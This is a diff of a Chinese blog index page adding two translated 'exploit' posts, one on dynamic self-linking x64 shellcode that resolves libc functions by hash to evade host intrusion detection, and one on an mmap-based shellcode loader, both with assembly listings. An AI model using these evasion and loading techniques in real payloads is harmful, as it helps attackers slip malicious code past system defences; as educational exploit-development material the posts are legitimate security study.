@@ -207,8 +207,8 @@
             
               
                 
-                <a class="post-title-link" href="/life/2015/11/15/2013-09-30/" itemprop="url">
-                  九月将尽
+                <a class="post-title-link" href="/exploit/2015/03/17/shellcodedynamic/" itemprop="url">
+                  Shellcode/Dynamic
                 </a>
               
             
@@ -218,8 +218,1146 @@
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:31+08:00" content="2015-11-15">
-              2015-11-15
+            <time itemprop="dateCreated" datetime="2015-03-17T00:00:00+08:00" content="2015-03-17">
+              2015-03-17
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/exploit/2015/03/17/shellcodedynamic/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/17/shellcodedynamic/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <p>意译：<a href="http://blackhat.life/Dynamic_Shellcode" target="_blank" rel="external">Shellcode/Dynamic</a></p>
+<p>动态shellcode是自链接的shellcode，用来规避多种主机层面的防护措施，比如主机入侵检测系统(HIDS)或者主机入侵防护系统(HIPS)。这些措施能阻止传统的null-free shellcode。通过动态shellcode技术，实现比如不包含中断、系统调用或者明文函数字符串等。</p>
+<p>[TOC]</p>
+<h2 id="评价">评价</h2><p>大多安全设施组件都基于RAM的数据和标记为可执行的内容进行运行时分析。而且，许多系统甚至从内核检查内核中断和系统调用(linux审计工具audit就做这个)。其它也许监视ld-linux中提供给普通应用使用共享库调用的<code>_ld_runtime_resolve</code>的运行，<code>_dl_fixup()</code>的蹦床(trampoline,确定不是函数式编程？？？？)等。当应用尝试执行不在它们<code>.text</code>段的系统调用或中断、或者尝试使用<code>_ld_runtime_resolve</code>，<code>_dl_fixup</code>,<code>dl_open</code>,<code>dl_close</code>或者<code>dl_sym</code>来导入一个不在它导入表(import talbe)的函数时，会触发许多安全系统的警告。另外，使用比如像<code>dl_open()</code>和<code>dl_sym()</code>这样的函数需要使用明文字符串。任何一般的分析都能很容易迅速逆向有效载荷，这是传统null-free shellcode的另一个问题。</p>
+<p>一个动态shellcode引擎能够解决这些问题。通过避免C调用惯例使用的寄存器，它可以构建允许开发者写出动态自链接代码的链接器(linker)。于是完全不再需要中断或者系统调用，因为链接器能不倚靠操作系统导入函数。另外，函数哈希被用作阻止函数名通过字符串呈现，解决了上面标准null-free shellcode有的问题。</p>
+<h2 id="C调用惯例的影响">C调用惯例的影响</h2><p>通常的系统调用格式或者libc函数调用：</p>
+<pre><code>function_call(<span class="decorator">%rax</span>) = <span class="keyword">function</span>(<span class="decorator">%rdi</span>,  <span class="decorator">%rsi</span>,  <span class="decorator">%rdx</span>,  <span class="decorator">%r10</span>,  <span class="decorator">%r8</span>,  <span class="decorator">%r9</span>)
+</code></pre><p>返回值通常置于<code>rax</code>中，然而当结构指针被作为参数传递时，在那个参数寄存器中一个指向更改过的结构的指针被返回。</p>
+<p>以上陈述显示：写一个链接器时，以下寄存器在没有系统调用的调用之前，不必为函数调用保存。</p>
+<pre><code><span class="xml"></span><span class="perl"><span class="variable">%rax</span>, <span class="variable">%rbx</span>, <span class="variable">%rcx</span>, <span class="variable">%rbp</span>, <span class="variable">%r11</span>, <span class="variable">%r12</span>, <span class="variable">%r13</span>, <span class="variable">%r14</span>, <span class="variable">%r15</span></span><span class="xml"></span>
+</code></pre><p>大多数寄存器能更改或者被各种libc函数更改，然而<code>rbx</code>在libc中被保留为开发者使用。当写一个动态链接器时，函数参数必须被保留，这样开发者能轻易写出动态集成的代码。最后，链接器取<code>rbx</code>作为库的基址指针，<code>rbp</code>用来哈希函数。这确保了开发者能保持对<code>rax</code>,<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>r10</code>,<code>r8</code>和<code>r9</code>的控制。<code>rcx</code>寄存器被用来作为指向调用函数标签的指针，也许应在函数调用间被保留。</p>
+<h2 id="函数哈希">函数哈希</h2><p>这个功能希望<code>rdx</code>是0，<code>rsi</code>中是指向字符串的指针。接着它完成字符串的单向32位哈希并保存在<code>rsi</code>中。</p>
+<p>首先，把被哈希程序(hasher)使用的不是<code>rsi</code>的寄存器保留：</p>
+<pre><code><span class="label">calc_hash:</span>
+
+<span class="label">preserve_regs:</span>
+    <span class="keyword">push</span> rax
+    <span class="keyword">push</span> rdx
+</code></pre><p><code>rdx</code>作为调用哈希程序的代码的零寄存器(zreg/zero register)。可以指通过简单的<code>push/pop</code>把<code>rax</code>置零来：</p>
+<pre><code><span class="label">initialize_regs:</span>
+    <span class="keyword">push</span> <span class="literal">rdx</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span>
+</code></pre><p>接着，DF位(directional flag)被清空。这很重要，因为接下来的哈希过程使用了<code>lodsd</code>，而有漏洞应用的DF位不确定。</p>
+<pre><code><span class="keyword">cld</span>
+</code></pre><p>接着，<code>al</code>中的字节和<code>edx</code>相加，结果存入<code>edx</code>。左移12位(0xc)，当<code>lodsd</code>载入的字节是null时，哈希值就计算完毕了。</p>
+<pre><code><span class="label">calc_hash_loop:</span>
+    <span class="keyword">lodsb</span>
+    <span class="keyword">rol</span> <span class="literal">edx</span>, <span class="number">0xc</span>
+    <span class="keyword">add</span> <span class="literal">edx</span>, <span class="literal">eax</span>
+    <span class="keyword">test</span> <span class="literal">al</span>, <span class="literal">al</span>
+    <span class="keyword">jnz</span> calc_hash_loop
+</code></pre><p>接着使用push和pop把哈希置入<code>rsi</code>：</p>
+<pre><code><span class="label">calc_done:</span>
+    <span class="keyword">push</span> <span class="literal">rdx</span>
+    <span class="keyword">pop</span> <span class="literal">rsi</span>
+</code></pre><p>最后，恢复保存到寄存器</p>
+<pre><code><span class="label">restore_regs:</span>
+    <span class="keyword">pop</span> <span class="literal">rdx</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span>
+</code></pre><h2 id="遍历到GOT的动态节(dynamic_section)">遍历到GOT的动态节(dynamic section)</h2><p>当前执行进程的动态节程序头总是在VMA(Virtual Memory Adress，虚拟内存地址)<code>0x00400130</code>。以下是个没有<code>\x00</code>(null-free)的版本：</p>
+<pre><code><span class="label">_start:</span>
+    <span class="keyword">push</span> <span class="number">0x400130ff</span>
+    <span class="keyword">pop</span> <span class="literal">rbx</span>
+    <span class="keyword">shr</span> <span class="literal">ebx</span>, <span class="number">0x8</span>
+</code></pre><p>指向动态节的指针被抽取，长度被添加到动态节的长度上。GOT(Global Offset Table，全局偏移表)刚好就在动态节后面。通过以这种方式计算偏移量，可以不必从文件头中读取GOT的位置来遍历GOT。这有无数的好处。(译者：不知道有啥好处。。。)</p>
+<pre><code><span class="label">fast_got:</span>
+    <span class="keyword">mov</span> <span class="literal">rcx</span>, [<span class="literal">rbx</span>]
+    <span class="keyword">add</span> <span class="literal">rcx</span>, [<span class="literal">rbx</span>+<span class="number">0x10</span>]
+</code></pre><h3 id="抽取一个库指针">抽取一个库指针</h3><p>这个代码从GOT抽取个指向libc中任意函数的指针。比如在<code>rcx+0x18</code>地方，有指向<code>_dl_runtime_resolve</code>的指针。</p>
+<pre><code><span class="label">extract_pointer:</span>
+    <span class="keyword">mov</span> <span class="literal">rbx</span>, [<span class="literal">rcx</span>+<span class="number">0x20</span>]
+</code></pre><p>现在寻找想要导入的二进制文件的基指针，首先寻找<code>\x7fELF</code>。因为RAM倒着保存信息，使用逆向比较来决定何时逆向循环。</p>
+<pre><code><span class="label">find_base:</span>
+    <span class="keyword">dec</span> <span class="literal">rbx</span>
+    <span class="keyword">cmp</span> [<span class="literal">rbx</span>], <span class="number">0x464c457f</span>
+    <span class="keyword">jne</span> find_base
+</code></pre><h3 id="用户定义代码">用户定义代码</h3><p>现在基指针被计算出来，该载入开发者或用户的代码了。为了让调用函数(<code>invoke_function</code>)从寄存器中可重用，通过getPC来把调用函数的地址存入<code>rcx</code>。</p>
+<pre><code><span class="keyword">jmp</span> startup
+
+<span class="label">__initialize_world:</span>
+    <span class="keyword">pop</span> rcx
+    <span class="keyword">jmp</span> _world
+
+<span class="label">startup:</span>
+    <span class="keyword">call</span> __initialize_word
+
+<span class="label">invoke_function:</span>
+    ...
+<span class="label">_world:</span>
+    <span class="comment">; user-defined code goes here</span>
+</code></pre><h3 id="接口">接口</h3><p>这里开发的运行时链接器能让用户自定的代码从<code>_world</code>开始。这个接口让开发者能提供函数哈希到<code>rbp</code>并且执行<code>call [rcx]</code>代替系统调用。这个例子描述了从内核调用exit(0)到使用链接器的API来调用exit(0)的过程。</p>
+<p>以未链接的exit形式开始：</p>
+<pre><code>exit：
+    <span class="keyword">push</span> <span class="number">0x3c</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span>
+    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
+    <span class="keyword">syscall</span>
+</code></pre><p>哈希<code>exit</code>(上面的相加右移)得到<code>0x696c4780</code></p>
+<pre><code> ✘  ~/Work/project/blackhat/shellcode  cat hash-generator.s 
+<span class="built_in">BITS</span> <span class="number">64</span>
+
+<span class="built_in">global</span> _start
+<span class="label">_start:</span>
+    <span class="keyword">jmp</span> startup
+<span class="label">
+calc_hash:</span>
+<span class="comment">; accept rsi hold function name.</span>
+<span class="comment">; rdx=0 first</span>
+<span class="comment">; return hash in rsi</span>
+<span class="comment">; use rax, rdx, rsi</span>
+    <span class="comment">; preserve rax&amp;rdx</span>
+    <span class="keyword">push</span> <span class="literal">rax</span>    <span class="comment">; use as accum</span>
+    <span class="keyword">push</span> <span class="literal">rdx</span>    <span class="comment">; zero register</span>
+<span class="label">
+    initialize_regs:</span>
+        <span class="keyword">push</span> <span class="literal">rdx</span>
+        <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">;rax = 0</span>
+        <span class="keyword">cld</span><span class="comment">; clear zf for lodsb</span>
+<span class="label">
+        calc_hash_loop:</span>
+            <span class="keyword">lodsb</span>   <span class="comment">; load one byte from rsi to al</span>
+            <span class="keyword">rol</span> <span class="literal">edx</span>, <span class="number">0xc</span>    <span class="comment">;right shift 12bits</span>
+            <span class="keyword">add</span> <span class="literal">edx</span>, <span class="literal">eax</span>    <span class="comment">;add eax to edx</span>
+            <span class="keyword">test</span> <span class="literal">al</span>, <span class="literal">al</span>     <span class="comment">; if al='\0'</span>
+            <span class="keyword">jnz</span> calc_hash_loop
+<span class="label">
+    calc_done:</span>
+        <span class="keyword">push</span> <span class="literal">rdx</span>
+        <span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; move hash in rdx to rsi</span>
+
+    <span class="keyword">pop</span> <span class="literal">rdx</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">; restore rdx&amp;rax</span>
+<span class="keyword">ret</span>
+<span class="label">
+startup:</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">; pointer to calc_hash</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">; argc</span>
+    <span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; pointer to argv[]</span>
+
+    <span class="keyword">xor</span> <span class="literal">rdx</span>, <span class="literal">rdx</span>    <span class="comment">;rdx=0</span>
+    <span class="keyword">call</span> calc_hash
+
+    <span class="keyword">push</span> <span class="literal">rsi</span>    <span class="comment">; save hash on stack</span>
+    <span class="keyword">mov</span> <span class="literal">rsi</span>, <span class="literal">rsp</span>    <span class="comment">; rsi hold pointer to hash now</span>
+
+    <span class="keyword">push</span> <span class="literal">rdx</span>    <span class="comment">; null</span>
+    <span class="keyword">mov</span> <span class="literal">rcx</span>, <span class="literal">rsp</span>    <span class="comment">; rcx hold pointer to null now</span>
+
+    <span class="keyword">mov</span> <span class="literal">rdi</span>, <span class="number">0x4</span>
+<span class="label">    loop:</span>
+        <span class="comment">; 倒着复制的</span>
+        <span class="keyword">dec</span> <span class="literal">rdi</span>
+        <span class="keyword">mov</span> <span class="literal">al</span>, [<span class="literal">rsi</span>+<span class="literal">rdi</span>*<span class="number">1</span>]
+        <span class="keyword">mov</span> [<span class="literal">rcx</span>+<span class="literal">rdx</span>*<span class="number">1</span>], <span class="literal">al</span>
+        <span class="keyword">inc</span> <span class="literal">rdx</span>
+        <span class="keyword">cmp</span> <span class="literal">rdi</span>, <span class="number">0</span>  <span class="comment">; gas 竟然不能cmp %rdi, $0....但可以倒过来</span>
+        <span class="keyword">jnz</span> <span class="keyword">loop</span>
+
+    <span class="keyword">mov</span> <span class="literal">rsi</span>, <span class="literal">rcx</span>    <span class="comment">;rsi hold pointer to reverse hash</span>
+    <span class="keyword">inc</span> <span class="literal">rdi</span> <span class="comment">; rdi = 1</span>
+    <span class="keyword">mov</span> <span class="literal">rax</span>, <span class="literal">rdi</span>    <span class="comment">; rax = 1</span>
+    <span class="keyword">syscall</span>         <span class="comment">; write(1, reverse hash)</span>
+
+    <span class="keyword">mov</span> <span class="literal">rax</span>, <span class="number">0x3c</span>   <span class="comment">; rax=60</span>
+    <span class="keyword">dec</span> <span class="literal">rdi</span>         <span class="comment">; rdi=0</span>
+    <span class="keyword">syscall</span>         <span class="comment">; exit(0)</span>
+ ~/Work/project/blackhat/shellcode  nasm -felf64 hash-generator.s -o hash-generator.o
+ ~/Work/project/blackhat/shellcode  ld hash-generator.o -o hash-generator
+ ~/Work/project/blackhat/shellcode  ./hash-generator exit|hexdump -C
+<span class="number">00000000</span>  <span class="number">69</span> 6c <span class="number">47</span> <span class="number">80</span>                                       |ilG.|
+<span class="number">00000004</span>
+</code></pre><p>所以，<code>_world</code>这么写</p>
+<pre><code><span class="label">_world:</span>
+    <span class="keyword">push</span> <span class="number">0x696c4780</span>
+    <span class="keyword">pop</span> <span class="literal">rbp</span> <span class="comment">; 正好倒过来，看看hash-generator.s的代码</span>
+    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
+    <span class="keyword">call</span> [<span class="literal">rcx</span>]
+</code></pre><p>开发者应该记着当调用那些可能改变寄存器的调用函数时保存<code>rcx</code>。或者通过更改<code>__initialize_world</code>中pop到的寄存器来移除限制。</p>
+<h3 id="调用的函数">调用的函数</h3><p>这个注释是为了防止开发者忘记接口功能：</p>
+<pre><code><span class="comment">;</span>
+<span class="comment">;  Takes a function hash in %rbp and base pointer in %rbx</span>
+<span class="comment">;  &gt;Parses the dynamic program headers of the ELF64 image</span>
+<span class="comment">;  &gt;Uses ROP to invoke the function on the way back to the</span>
+<span class="comment">;  -normal return location</span>
+<span class="comment">;</span>
+<span class="comment">;  Returns results of function to invoke.</span>
+<span class="comment">;</span>
+</code></pre><p>所有和libc交互的寄存器和任何可能被链接器使用的寄存器必须被保留，这样它们才能在函数调用时被恢复，<code>rbp</code>寄存器被保留两次。这时因为第一次保留在返回前被指向目的函数的指针覆盖。这让shellcode从目的函数返回到开发者定义的函数。</p>
+<pre><code><span class="label">invoke_function:</span>
+    <span class="keyword">push</span> <span class="literal">rbp</span>
+    <span class="keyword">push</span> <span class="literal">rbp</span>
+    <span class="keyword">push</span> <span class="literal">rdx</span>
+    <span class="keyword">push</span> <span class="literal">rdi</span>
+    <span class="keyword">push</span> <span class="literal">rax</span>
+    <span class="keyword">push</span> <span class="literal">rbx</span>
+    <span class="keyword">push</span> <span class="literal">rsi</span>
+</code></pre><p>将<code>rdx</code>赋为0,吧函数哈希放入<code>rdi</code>来进行将来的比较</p>
+<pre><code><span class="label">set_regs:</span>
+    <span class="keyword">xor</span> <span class="literal">rdx</span>, <span class="literal">rdx</span>
+    <span class="keyword">push</span> <span class="literal">rbp</span>
+    <span class="keyword">pop</span> <span class="literal">rdi</span>
+</code></pre><p>然后目的库导入的基址指针就放入<code>rbp</code></p>
+<pre><code><span class="label">copy_base:</span>
+    <span class="keyword">push</span> <span class="literal">rbx</span>
+    <span class="keyword">pop</span> <span class="literal">rbp</span>
+</code></pre><p>需要读取<code>[rbx+0x130]</code>四字节，但是添加到八字节的寄存器。</p>
+<pre><code><span class="label">read_dynamic_section:</span>
+    <span class="keyword">push</span> <span class="number">0x4c</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span>
+    <span class="keyword">add</span> <span class="literal">rbx</span>, [<span class="literal">rbx</span> + <span class="literal">rax</span> * <span class="number">4</span>]
+</code></pre><p>找到函数导出表，一般叫做<code>.dynsym</code>，或者动态符号表。通过遍历头检查动态节的类型。</p>
+<pre><code><span class="label">check_dynamic_type:</span>
+    <span class="keyword">add</span> <span class="literal">rbx</span>, <span class="number">0x10</span>
+    cmpb [<span class="literal">rbx</span>], <span class="number">0x5</span>
+    <span class="keyword">jne</span> check_dynamic_type
+</code></pre><p>一旦ebx指向程序头中正确的位置;放置字符串表的绝对地址到<code>rax</code>和动态符号表的绝对地址到<code>rbx</code>。</p>
+<pre><code><span class="label">string_table_found:</span>
+    <span class="keyword">mov</span> <span class="literal">rax</span>, [<span class="literal">rbx</span>+<span class="number">0x8</span>]  <span class="comment">; rax是动态字符串表的地址</span>
+    <span class="keyword">mov</span> <span class="literal">rbx</span>, [<span class="literal">rbx</span>+<span class="number">0x18</span>] <span class="comment">; rbx是指向符号表的地址</span>
+</code></pre><p>接着，增加到下一个导出，指向字符串的指针被放入<code>rsi</code>来哈希</p>
+<pre><code><span class="label">check_next_hash:</span>
+    <span class="keyword">add</span> <span class="literal">rbx</span>, <span class="number">0x18</span>   <span class="comment">;下一个条目</span>
+    <span class="keyword">push</span> <span class="literal">rdx</span>
+    <span class="keyword">pop</span> <span class="literal">rsi</span>
+    <span class="keyword">xor</span> <span class="literal">si</span>, [<span class="literal">rbx</span>]
+    <span class="keyword">add</span> <span class="literal">rsi</span>, <span class="literal">rax</span>
+</code></pre><p><code>calc_hash</code>标签被如上描述方式调用来哈希函数名。</p>
+<pre><code><span class="label">calc_hash:</span>
+    ...
+</code></pre><p>比较当前导出表的函数哈希和想要导出的函数哈希，如果不匹配则跳到下一次导入：</p>
+<pre><code><span class="label">check_current_hash:</span>
+    <span class="keyword">cmp</span> <span class="literal">edi</span>, <span class="literal">esi</span>
+    <span class="keyword">jne</span> check_next_hash
+</code></pre><p>一旦哈希被找到，它的函数偏移位于<code>[rbx+0x8]</code>四字节。<code>rdx</code>被用来作为零寄存器来得到没有<code>\x00</code>的四字节。FIXME(not so) 添加到<code>rbp</code>基址指针：</p>
+<pre><code><span class="label">found_hash:</span>
+    <span class="keyword">add</span> <span class="literal">rbp</span>, [<span class="literal">rbx</span>+<span class="number">4</span>*<span class="literal">rdx</span>+<span class="number">0x8</span>]
+</code></pre><p>这里，第一个例子中被保留的<code>rbp</code>被目的函数的地址覆盖。</p>
+<pre><code><span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x30</span>], <span class="literal">rbp</span>
+</code></pre><p>最后恢复所有寄存器。</p>
+<pre><code>    <span class="keyword">pop</span> <span class="literal">rsi</span>
+    <span class="keyword">pop</span> <span class="literal">rbx</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span>
+    <span class="keyword">pop</span> <span class="literal">rdi</span>
+    <span class="keyword">pop</span> <span class="literal">rdx</span>
+    <span class="keyword">pop</span> <span class="literal">rbp</span>
+<span class="keyword">ret</span>
+</code></pre><p>跳到目的函数代码。</p>
+<h3 id="动态shell">动态shell</h3><p>一旦添加链接器，一个115字节的socket重用载荷就变成了268字节的动态载入版本。这里有几种优化的方式，作为读者的练习。。。我得回头看看。。。</p>
+<p>算了，我先看看<a href="http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/" target="_blank" rel="external">Load-time relocation of shared libraries</a></p>
+<p>令上午承蒙翔哥内推，刚填了简历，下午竟然就给我打电话电面了。。。然后就是强行谈及二进制安全被血虐最后被鄙视的过程，哈哈哈。</p>
+<p>慢慢看，不把安全作为工作也许是种幸福呢。</p>
+<p>毕业前：</p>
+<ul>
+<li>游戏</li>
+<li>画</li>
+</ul>
+<p>兴趣：</p>
+<ul>
+<li>统计学习</li>
+<li>二进制安全</li>
+</ul>
+<p>工作：</p>
+<ul>
+<li>？</li>
+</ul>
+
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/exploit/2015/03/16/shellcodeloaders/" itemprop="url">
+                  Shellcode/Loaders
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2015-03-16T00:00:00+08:00" content="2015-03-16">
+              2015-03-16
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/exploit/2015/03/16/shellcodeloaders/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/16/shellcodeloaders/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <p>意译：<a href="http://blackhat.life/Shellcode_Loaders" target="_blank" rel="external">Shellcode/Loaders</a></p>
+<p>shellcode Loader被用在缓冲区溢出或者其它形式的二进制挖掘活动中测试shellcode。最好的方法嘛，构建从命令行参数的用户友好的loader，并且传递给刚分配的可执行内存空间。本文在x86指令集写x64汇编来在linux上构建这么个载入器。</p>
+<p>32位的在文末给出</p>
+<p>[TOC]</p>
+<h2 id="可执行loader">可执行loader</h2><h3 id="命令行参数">命令行参数</h3><p>命令行参数入栈的顺序是：第二个参数，第一个参数，参数数目。因此，为了从参数获得shellcode，<code>pop rbx</code>三次。一旦完成，<code>rbx</code>将包含指向shellcode的指针：</p>
+<pre><code><span class="built_in">BITS</span> <span class="number">64</span>
+<span class="built_in">global</span> _start
+<span class="label">_start:</span>
+    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">;argc</span>
+    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">; 参数列表指针</span>
+    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">; 指向第一个参数的指针</span>
+</code></pre><h3 id="通过mmap()分配可执行内存区域">通过mmap()分配可执行内存区域</h3><p>参考x64 syscall table，自己谷歌就好。</p>
+<p>现代操作系统的栈默认并不可执行，但我们成功执行代码需要一个可执行栈。这可以通过mmap系统调用实现。</p>
+<p><code>mmap()</code>的原型是(<code>man mmap</code>)：</p>
+<pre><code><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, size_t length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,
+                 <span class="keyword">int</span> fd, off_t offset)</span></span>;
+</code></pre><p>在64位处理器上，函数调用如下：</p>
+<pre><code>function_call(<span class="variable">%rax</span>) = function(<span class="variable">%rdi</span>,  <span class="variable">%rsi</span>,  <span class="variable">%rdx</span>,  <span class="variable">%r10</span>,  <span class="variable">%r8</span>,  <span class="variable">%r9</span>)
+              ^<span class="keyword">system</span>          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
+               call <span class="comment">#</span>
+</code></pre><p>首先，<code>mmap()</code>的系统调用数(syscall number)放入<code>rax</code>：</p>
+<pre><code><span class="keyword">push</span> <span class="number">0x9</span>
+<span class="keyword">pop</span> <span class="literal">rax</span>
+</code></pre><p><code>mmap()</code>的第一个参数需要是<code>null</code>，所以<code>xor rdi rdi</code>。</p>
+<pre><code><span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
+</code></pre><p>指定缓冲区大小(4096字节或者0x1000字节) ，这个参数传给<code>rsi</code></p>
+<pre><code><span class="keyword">push</span> <span class="literal">rdi</span>
+<span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; rsi = 0</span>
+<span class="keyword">inc</span> <span class="literal">rsi</span> <span class="comment">; rsi = 1</span>
+<span class="keyword">shl</span> <span class="literal">rsi</span>, <span class="number">0xc</span>  <span class="comment">; rsi=0x1000</span>
+</code></pre><p>第三个参数<code>prot</code>保存在<code>rdx</code>中，是内核权限标志(读、写、执行或无)，对多个标志，它们用按位或方式合在一起，<code>PROT_READ|PROT_WRITE|PROT_EXEC</code>是数字<code>7</code>,所以直接在<code>rdx</code>中放入7就行。</p>
+<pre><code><span class="keyword">push</span> <span class="number">0x7</span>
+<span class="keyword">pop</span> <span class="literal">rdx</span>
+</code></pre><p>接下来的参数<code>flag</code>跟<code>prot</code>类似，保存了内存映射标志。本例中设置为<code>MAP_PRIVATE|MAP_ANONYMOUS</code>，其值为数字<code>0x22</code>。存储在<code>r10</code>中。</p>
+<pre><code><span class="keyword">push </span><span class="number">0x22</span>
+<span class="keyword">pop </span><span class="literal">r10</span>
+</code></pre><p>最后两个参数应该为<code>null</code>，放到<code>r8</code>和<code>r9</code>中</p>
+<pre><code><span class="keyword">push</span> <span class="literal">rdi</span>
+<span class="keyword">push</span> <span class="literal">rdi</span>
+<span class="keyword">pop</span> <span class="literal">r8</span>
+<span class="keyword">pop</span> <span class="literal">r9</span>
+</code></pre><p>万事具备，进行系统调用。</p>
+<pre><code><span class="keyword">syscall</span>
+</code></pre><p>接下来<code>rax</code>中就包含指向缓冲区的指针，这个指针可以用来把shellcode拷贝进去。</p>
+<h3 id="拷贝代码到新内存区域">拷贝代码到新内存区域</h3><p>把<code>rsi</code>作为计数器，初始化为0：</p>
+<pre><code>inject：
+    <span class="keyword">xor</span> <span class="literal">rsi</span>, <span class="literal">rsi</span>
+</code></pre><p>把<code>rdi</code>设为<code>null</code>，等下要把当前字节和<code>dil</code>(rdi低8位)中的值比较来确定shellcode的结束位置。</p>
+<pre><code><span class="keyword">push</span> <span class="literal">rsi</span>
+<span class="keyword">pop</span> <span class="literal">rdi</span>
+</code></pre><p>如果拷贝到达shellcode末尾，则跳到<code>inject_finished</code>：</p>
+<pre><code><span class="label">inject_loop:</span>
+    <span class="keyword">cmp</span> [<span class="literal">rbx</span> + <span class="literal">rsi</span> * <span class="number">1</span>], <span class="literal">dil</span>
+    <span class="keyword">je</span> inject_finished
+</code></pre><p>每个字节从<code>[rbx + rsi]</code>移动到<code>[rax + rsi]</code>，通过<code>r10b</code>(<code>r10</code>低八位)。</p>
+<pre><code><span class="keyword">mov</span> <span class="literal">r10b</span>, [<span class="literal">rbx</span>+<span class="literal">rsi</span>*<span class="number">1</span>]
+<span class="keyword">mov</span> [<span class="literal">rax</span>+<span class="literal">rsi</span>*<span class="number">1</span>], <span class="literal">r10b</span>
+</code></pre><p><code>rsi</code>作为偏移量和计数器：</p>
+<pre><code><span class="keyword">inc</span> <span class="literal">rsi</span>
+</code></pre><p>继续循环</p>
+<pre><code><span class="keyword">jmp</span> inject_loop:
+</code></pre><p>在<code>inject_finished</code>程序出附上<code>ret</code>操作符(opcode)<code>0xc3</code></p>
+<pre><code><span class="label">inject_finished:</span>
+    <span class="keyword">mov</span> <span class="preprocessor">byte</span> [<span class="literal">rax</span>+<span class="literal">rsi</span>*<span class="number">1</span>], <span class="number">0xc3</span>
+</code></pre><p>一般，操作符(opcode)指指令而字节码(bytecode)不仅包含操作符还包含参数，成为操作数(operand)。</p>
+<h3 id="返回代码">返回代码</h3><p>代码返回而不是跳转或被调用的原因在于，这更充分模拟了类似有漏洞应用在缓冲区溢出时的环境。有效载荷会返回，因此，当shellcode被加载后，它应该返回。</p>
+<p>首先调用<code>ret_to_shellcode</code>。这会把<code>exit</code>的地址推入栈顶，于是shellcode结束后返回<code>exit</code>的地址。</p>
+<pre><code><span class="built_in">call</span> ret_to_shellcode
+</code></pre><p>原始的返回地址被覆盖为为shellcode的地址，并且进入(returned into)</p>
+<pre><code><span class="label">ret_to_shellcode:</span>
+    <span class="keyword">push</span> rax
+    <span class="keyword">ret</span>
+</code></pre><p>当shellcode结束时，将返回到<code>exit</code>函数优雅的退出</p>
+<pre><code>exit：
+    <span class="keyword">push</span> <span class="number">60</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span>
+    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
+    <span class="keyword">syscall</span>
+</code></pre><h3 id="执行loader">执行loader</h3><p>编译链接吧</p>
+<pre><code> <span class="special">~</span>/Work/project/blackhat/shellcode  nasm -felf64 loader64.s -o loader64.o
+ <span class="special">~</span>/Work/project/blackhat/shellcode  ld loader64.o -o loader64
